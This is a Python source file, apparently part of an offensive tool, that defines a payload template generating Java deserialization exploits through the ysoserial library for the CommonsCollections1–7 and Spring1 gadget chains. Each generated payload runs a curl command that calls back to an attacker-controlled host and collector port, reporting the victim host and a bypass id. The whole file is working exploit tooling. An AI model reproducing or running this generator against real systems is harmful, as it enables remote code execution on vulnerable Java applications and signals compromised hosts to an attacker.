import os
import string

import jnius_config


from horrors import (
    logging,
    templates,
)


class YsoserialPayload(templates.Template):
    template_context = {
        'SHELL_EXEC': 'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID\"',
    }

    PAYLOAD_CLASSES = [
        'CommonsCollections1',
        'CommonsCollections2',
        'CommonsCollections3',
        'CommonsCollections4',
        'CommonsCollections5',
        'CommonsCollections6',
        'CommonsCollections7',
        'Spring1',
    ]

    def __init__(self, config):
        self.config = config
        if not jnius_config.vm_running:
            if not os.environ.get('JVM_PATH'):
                try:
                    os.environ['JVM_PATH'] = config.JVM_LIB
                except AttributeError:
                    logging.debug('JVM lib path isn\'t defined in env PATH or in config file.')

        try:
            if config.YSOSERIAL not in jnius_config.get_classpath():
                jnius_config.add_classpath(config.YSOSERIAL)
        except AttributeError:
            logging.debug('YSOSERIAL jar path isn\'t defined in config file.')

    def generate(self, request_context):
        from jnius import autoclass
        # FIXME: Optimize
        context = self.template_context.copy()
        for key, val in context.items():
            context[key] = string.Template(val).substitute(request_context)
        payload = autoclass(f'ysoserial.payloads.{request_context["CLASS"]}')()
        object = payload.getObject(context['SHELL_EXEC'])
        ser_object = autoclass('ysoserial.Serializer').serialize(object)
        logging.debug(b'Ysoserial output: ' + ser_object.tostring())
        return ser_object
